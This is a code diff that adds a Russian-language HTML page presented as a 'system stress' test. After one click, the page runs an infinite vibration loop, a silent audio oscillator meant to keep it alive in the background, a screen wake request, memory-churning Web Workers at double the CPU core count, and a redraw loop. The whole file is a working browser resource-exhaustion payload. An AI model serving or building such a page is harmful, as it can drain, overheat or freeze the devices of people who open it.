@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Full Stress</title>
+    <style>
+        body { margin: 0; background: #000; color: #f00; font-family: sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .info { text-align: center; border: 2px solid #f00; padding: 20px; text-transform: uppercase; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; }
+    </style>
+</head>
+<body>
+    <div id="overlay"></div>
+    <div class="info">
+        <h1>Система готова</h1>
+        <p>Нажми в любом месте для активации нагрузки</p>
+    </div>
+
+    <script>
+        let activated = false;
+
+        document.getElementById('overlay').addEventListener('click', function() {
+            if (activated) return;
+            activated = true;
+            this.style.display = 'none';
+            
+            console.log("Активация полной нагрузки...");
+
+            // 1. ФЕЙКОВЫЙ ЗВУК (чтобы работать в фоне)
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioCtx.createOscillator();
+            const gainNode = audioCtx.createGain();
+            gainNode.gain.value = 0.01; // Почти бесшумно
+            oscillator.connect(gainNode);
+            gainNode.connect(audioCtx.destination);
+            oscillator.start();
+
+            // 2. WAKE LOCK (запрет сна)
+            if ('keepAwake' in screen) {
+                screen.keepAwake = true;
+            }
+
+            // 3. ВИБРАЦИЯ (бесконечный цикл)
+            setInterval(() => {
+                if (navigator.vibrate) navigator.vibrate(1000);
+            }, 1000);
+
+            // 4. МАКСИМАЛЬНАЯ НАГРУЗКА CPU (Web Workers)
+            const workerCode = `
+                self.onmessage = function() {
+                    while (true) {
+                        // Математический хаос
+                        let x = Math.random() * Math.random();
+                        for(let i=0; i<1000; i++) { x = Math.tan(x) + Math.atan(x); }
+                        // Мусор в память
+                        let b = new Array(500000).fill(x);
+                    }
+                };
+            `;
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const workerUrl = URL.createObjectURL(blob);
+            
+            const cores = navigator.hardwareConcurrency || 8;
+            for (let i = 0; i < cores * 2; i++) { // Запускаем в 2 раза больше воркеров, чем ядер
+                const worker = new Worker(workerUrl);
+                worker.postMessage("burn");
+            }
+
+            // 5. GPU & UI LOAD
+            const canvas = document.createElement('canvas');
+            document.body.appendChild(canvas);
+            const ctx = canvas.getContext('2d');
+            function stress() {
+                ctx.fillStyle = `rgb(${Math.random()*255},0,0)`;
+                ctx.fillRect(0,0, canvas.width, canvas.height);
+                requestAnimationFrame(stress);
+            }
+            stress();
+        });
+    </script>
+</body>
+</html>
+
